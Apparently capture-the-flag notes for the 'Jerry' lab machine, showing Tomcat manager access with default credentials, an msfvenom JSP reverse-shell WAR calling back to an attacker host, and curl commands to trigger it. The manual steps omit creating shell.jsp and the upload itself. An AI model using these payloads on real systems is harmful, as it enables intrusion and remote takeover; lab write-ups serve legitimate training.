# Jerry: Machine Notes

## Recon

### Nmap
- Port 8080/tcp open: Apache Tomcat/Coyote JSP engine 1.1 (Version 7.0.88)

### Findings
- The `/manager/html` page is accessible.
- Default credentials found via 401 response hint: `tomcat:s3cret`.

## Exploitation

### Tomcat Manager RCE
1. Generate a JSP reverse shell payload:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.244 LPORT=4444 -f war -o shell.war
```

2. Alternatively, create manually if the raw WAR fails:
```bash
# Create web.xml
cat > web.xml << 'EOF' 
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
         http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
         version="3.1">
    <display-name>shell</display-name>
</web-app>
EOF

# Package into WAR
jar -cvf shell.war shell.jsp
```

3. Deploy/Verify via curl:
```bash
# List apps
curl -s -u 'tomcat:s3cret' "http://10.129.136.9:8080/manager/text/list"

# Trigger shell
curl -v "http://10.129.136.9:8080/shell/shell.jsp"
```

### Foothold
- User: `nt authority\system`
- OS: Windows Server 2012 R2

## Post-Exploitation
- Flag Location: `C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt`
- Contains both User and Root flags.
